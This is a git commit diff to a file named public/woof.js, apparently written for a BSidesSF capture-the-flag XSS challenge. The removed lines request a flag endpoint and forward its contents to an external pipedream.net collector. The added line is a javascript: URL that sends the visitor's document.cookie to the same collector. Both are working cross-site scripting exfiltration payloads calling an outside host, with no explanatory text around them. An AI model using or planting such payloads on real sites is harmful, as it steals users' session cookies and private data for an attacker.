f244f1074371682924a9ae9211f61dc7bb4dd4b5
Zhongbob <89343697+Zhongbob@users.noreply.github.com>
2024-08-30 18:02:49 +0800

    stuff

--- public/woof.js
+++ public/woof.js
@@ -1,14 +1,2 @@
-var xhr = new XMLHttpRequest();
-xhr.onload = function() {
-    if (xhr.status >= 200 && xhr.status < 300) {
-        fetch("https://eo2jsc6xk7y9tec.m.pipedream.net?"+xhr.responseText);
-    } else {
-        console.log('The request failed with status:', xhr.status);
-    }
-};
-
-console.log("works");
-xhr.open('GET','https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag',true);
-xhr.send();
-
+javascript:fetch("https://eo2jsc6xk7y9tec.m.pipedream.net?cookie="+document.cookie);
 
